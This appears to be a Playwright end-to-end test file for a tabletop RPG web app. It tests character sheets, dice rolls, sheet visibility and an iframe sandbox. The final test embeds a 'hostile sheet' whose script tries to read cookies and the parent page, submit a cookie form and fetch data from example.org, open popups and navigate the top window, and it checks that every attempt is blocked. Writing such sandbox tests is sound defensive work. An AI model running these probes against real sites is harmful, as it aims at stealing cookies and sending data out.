import { expect, type FrameLocator, type Locator, type Page } from '@playwright/test';
import { BIA, CAIO } from './support/dev-players';
import { test } from './support/player-pages';
import {
  campaignIdOf,
  createStarterTemplate,
  createTemplateByApi,
  newSheetOnToken,
  openSheetFromCard,
  patchSheetValues,
  readSheet,
  setSheetVisibility,
  sheetButtonOf,
  sheetRegionOf,
  sheetTabOf,
  type SheetSourceCode,
} from './support/sheets';
import { adminCredentials, signIn } from './support/sign-in';
import { createTableAndReadCode, enterFromTheList, joinByCodeAndEnter } from './support/tables';
import { cardOf, createCharacterTokenWithPv, openCard } from './support/token-cards';

type SheetTable = Readonly<{ admin: Page; bia: Page; caio: Page | null; campaignId: string }>;

/** Ana's table with Bia (and Caio, when asked) as players, and Bia's character Lyra (PV 10 / 10)
 *  on a token at the center cell: a sheet made on the linked token is the character's, so the
 *  card lists it (a sheet on an unlinked token never shows there). Everyone in the room. */
async function openSheetTable(
  newPlayerPage: () => Promise<Page>,
  withCaio: boolean,
): Promise<SheetTable> {
  const name = `Mesa fichas ${Date.now()}`;
  const admin = await newPlayerPage();
  const bia = await newPlayerPage();
  await signIn(admin, adminCredentials());
  const code = await createTableAndReadCode(admin, name);
  await signIn(bia, BIA);
  await joinByCodeAndEnter(bia, code, admin);
  const caio = withCaio ? await newPlayerPage() : null;
  if (caio !== null) {
    await signIn(caio, CAIO);
    await joinByCodeAndEnter(caio, code, admin);
  }
  await enterFromTheList(admin, name);
  await createCharacterTokenWithPv(admin, 'Lyra', 'Bia');
  return { admin, bia, caio, campaignId: campaignIdOf(admin) };
}

function historyOf(page: Page): Locator {
  return page.getByRole('list', { name: 'Histórico de rolagens' }).getByRole('listitem');
}

async function expectSheetRollOn(page: Page): Promise<void> {
  await page.getByRole('tab', { name: 'Dados' }).click();
  const newest = historyOf(page).first();
  await expect(newest).toContainText('Ficha Tormenta · Ataque');
  // The starter rolls 1d20+5: "…" while the dice fly, then a total.
  await expect(newest.getByTestId('roll-total')).toHaveText(/^\d+$/, { timeout: 30_000 });
  const total = Number(await newest.getByTestId('roll-total').textContent());
  expect(total).toBeGreaterThanOrEqual(6);
  expect(total).toBeLessThanOrEqual(25);
}

// Bia types 14 in "Força" (the starter saves on `change`, so the field is left by Tab).
async function setStrength(sheet: FrameLocator): Promise<void> {
  const strength = sheet.getByRole('spinbutton', { name: 'Força' });
  await strength.fill('14');
  await strength.press('Tab');
}

test('Ana makes a sheet on Lyra; Bia takes 5 PV, rolls the attack and keeps Força on F5', async ({
  newPlayerPage,
}) => {
  test.setTimeout(180_000);
  const { admin, bia, campaignId } = await openSheetTable(newPlayerPage, false);
  await createStarterTemplate(admin, 'Ficha Tormenta');
  const { sheetId, name: sheetName } = await newSheetOnToken(admin, 'Lyra', 'Ficha Tormenta');
  expect(sheetName).toBe('Ficha Tormenta · Lyra');

  const sheet = await openSheetFromCard(bia, 'Lyra', sheetName);
  await expect(sheetRegionOf(bia, sheetName)).toContainText('Ficha Tormenta');
  await expect(sheetRegionOf(bia, sheetName)).toContainText('Ficha da mesa · código do mestre');
  await expect(sheetRegionOf(bia, sheetName)).not.toContainText('Somente leitura');
  await expect(sheet.getByRole('heading', { name: 'Lyra' })).toBeVisible();
  await expect(sheet.locator('#pv')).toHaveText('10 / 10');

  // "−5 PV" goes through `sheet:adjustBar` to the character: Ana's Lyra shows it.
  await sheet.getByRole('button', { name: '−5 PV' }).click();
  await expect(sheet.locator('#pv')).toHaveText('5 / 10');
  await openCard(admin, 'Lyra');
  await expect(cardOf(admin, 'Lyra')).toContainText('5 / 10');

  // "Rolar ataque" is the `dice:roll` of Bia, labelled "<template> · Ataque", for both.
  await sheet.getByRole('button', { name: 'Rolar ataque' }).click();
  await expectSheetRollOn(admin);
  // An open sheet takes the board and the side panel: Bia goes back to the grid to see the tray.
  await bia.getByRole('tab', { name: /^Cena 1/ }).click();
  await expectSheetRollOn(bia);
  await sheetTabOf(bia, sheetName).click();

  await setStrength(sheet);
  await expect
    .poll(async () => (await readSheet(bia, campaignId, sheetId)).values)
    .toEqual({
      forca: 14,
    });
  await bia.reload();
  const reloaded = await openSheetFromCard(bia, 'Lyra', sheetName);
  await expect(reloaded.getByRole('spinbutton', { name: 'Força' })).toHaveValue('14');
  await expect(reloaded.locator('#pv')).toHaveText('5 / 10');
});

test('a controllers sheet is hidden from Caio; on "A mesa toda" he reads it without editing, and loses it back', async ({
  newPlayerPage,
}) => {
  test.setTimeout(180_000);
  const { admin, caio, campaignId } = await openSheetTable(newPlayerPage, true);
  if (caio === null) throw new Error('this scenario needs Caio at the table');
  await createStarterTemplate(admin, 'Ficha Tormenta');
  const { sheetId, name: sheetName } = await newSheetOnToken(admin, 'Lyra', 'Ficha Tormenta');

  // "Só quem controla" (the default): the server answers 404 and the card has no button.
  expect((await readSheet(caio, campaignId, sheetId)).status).toBe(404);
  await expect(caio.getByRole('region', { name: 'Na mesa' })).toContainText('Lyra');
  await expect(sheetButtonOf(caio, 'Lyra')).toHaveCount(0);

  await setSheetVisibility(admin, 'Lyra', 'A mesa toda (só leitura)');
  const sheet = await openSheetFromCard(caio, 'Lyra', sheetName);
  await expect(sheetRegionOf(caio, sheetName)).toContainText('Somente leitura');
  await expect(sheet.getByRole('heading', { name: 'Lyra' })).toBeVisible();
  await expect(sheet.getByRole('spinbutton', { name: 'Força' })).toBeDisabled();
  expect(await patchSheetValues(caio, campaignId, sheetId, { forca: 1 })).toBe(403);

  // Back to "Só quem controla": Caio's tab closes with the reason and the button goes.
  await setSheetVisibility(admin, 'Lyra', 'Só quem controla');
  await expect(
    caio.getByRole('alert').filter({ hasText: `A ficha ${sheetName} foi fechada` }),
  ).toBeVisible();
  await expect(sheetRegionOf(caio, sheetName)).toHaveCount(0);
  await expect(sheetButtonOf(caio, 'Lyra')).toHaveCount(0);
  expect((await readSheet(caio, campaignId, sheetId)).status).toBe(404);
});

const OUTSIDE = 'https://example.org';
const APP_COOKIE = 'lorkarium-probe=app-secret';

// The arsenal of the sandbox proof (sheet-sandbox.spec.ts), now inside the real room: each probe
// writes its outcome into the frame's own page, read back through the frame locator.
const HOSTILE_SHEET: SheetSourceCode = {
  name: 'Ficha hostil',
  html: `<form id="steal" action="${OUTSIDE}/form" method="get"><input name="cookie" value="x"></form>
<button id="leave" type="button">Sair da ficha</button>`,
  css: '',
  js: `function report(probe, outcome) {
  const line = document.createElement('p');
  line.dataset.probe = probe;
  line.textContent = String(outcome);
  document.body.append(line);
}
function attempt(probe, run) { try { report(probe, run()); } catch (e) { report(probe, e.name); } }
const OUTSIDE = '${OUTSIDE}';
attempt('parent-document', () => parent.document.title);
attempt('top-href', () => top.location.href);
attempt('cookie-read', () => 'value:' + document.cookie);
attempt('cookie-write', () => { document.cookie = 'lorkarium-probe=frame-wrote; path=/'; return 'written'; });
attempt('storage', () => 'keys:' + localStorage.length);
fetch(OUTSIDE + '/fetch').then(() => report('fetch', 'reached'), (e) => report('fetch', e.name));
const image = new Image();
image.onload = () => report('image', 'loaded');
image.onerror = () => report('image', 'blocked');
image.src = OUTSIDE + '/pixel.png';
const link = document.createElement('link');
link.rel = 'stylesheet';
link.href = OUTSIDE + '/font.css';
link.onload = () => report('font', 'loaded');
link.onerror = () => report('font', 'blocked');
document.head.append(link);
import('https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/lodash.js').then(() => report('import', 'loaded'), (e) => report('import', e.name));
attempt('open', () => window.open(OUTSIDE + '/popup'));
attempt('top-navigate', () => { top.location = OUTSIDE + '/top'; return 'assigned'; });
document.getElementById('steal').submit();
setTimeout(() => report('form', 'still-here'), 500);
document.getElementById('leave').addEventListener('click', () => { location = OUTSIDE + '/self'; });
lorkarium.ready().then(() => report('sdk', 'ready'), (e) => report('sdk', e.name));`,
};

const HOSTILE_OUTCOMES: Readonly<Record<string, readonly string[]>> = {
  sdk: ['ready'],
  'parent-document': ['SecurityError'],
  'top-href': ['SecurityError'],
  'cookie-read': ['SecurityError', 'value:'],
  'cookie-write': ['SecurityError'],
  storage: ['SecurityError', 'keys:0'],
  fetch: ['TypeError'],
  image: ['blocked'],
  font: ['blocked'],
  import: ['TypeError'],
  open: ['null'],
  'top-navigate': ['SecurityError'],
  form: ['still-here'],
};

// Only what reaches the network counts: Chromium fires `page.on('request')` for a request the CSP
// blocks too (then `requestfailed` "csp"), so the leak is caught at the route, which never sees it.
async function catchLeaksOf(page: Page): Promise<string[]> {
  const leaked: string[] = [];
  await page.context().route(/^https?:\/\/(?!localhost[:/]|127\.0\.0\.1[:/])/, (route) => {
    leaked.push(route.request().url());
    return route.abort();
  });
  return leaked;
}

async function expectProbesRefused(sheet: FrameLocator): Promise<void> {
  for (const [probe, allowed] of Object.entries(HOSTILE_OUTCOMES)) {
    const line = sheet.locator(`[data-probe="${probe}"]`);
    await expect(line, `probe ${probe}`).toHaveCount(1);
    expect(allowed, `probe ${probe}`).toContain(await line.textContent());
  }
}

test('a hostile sheet in the real room reaches no outside site, reads no cookie and leaves the app cookie intact', async ({
  newPlayerPage,
}) => {
  test.setTimeout(180_000);
  const { admin, bia, campaignId } = await openSheetTable(newPlayerPage, false);
  await createTemplateByApi(admin, campaignId, HOSTILE_SHEET);
  const { name: sheetName } = await newSheetOnToken(admin, 'Lyra', 'Ficha hostil');
  const leaked = await catchLeaksOf(bia);
  let popups = 0;
  bia.context().on('page', () => (popups += 1));
  await bia.evaluate(`document.cookie = '${APP_COOKIE}; path=/'`);
  const cookieBefore = await bia.evaluate<string>('document.cookie');
  expect(cookieBefore).toContain(APP_COOKIE);

  const sheet = await openSheetFromCard(bia, 'Lyra', sheetName);
  await expectProbesRefused(sheet);
  await expect(sheet.locator('[data-probe="cookie-read"]')).not.toContainText('app-secret');
  expect(await bia.evaluate<string>('document.cookie')).toBe(cookieBefore);
  expect((await bia.request.get('/api/auth/me')).status()).toBe(200);
  expect(popups).toBe(0);

  // The frame navigating itself: the app's `frame-src 'self'` stops it, the room drops the frame.
  await sheet.getByRole('button', { name: 'Sair da ficha' }).click();
  await expect(bia.getByRole('alert').filter({ hasText: 'Ficha recarregada' })).toBeVisible();
  await expect(bia.locator(`iframe[title="Ficha · ${sheetName}"]`)).toHaveCount(0);
  expect(leaked).toEqual([]);
});
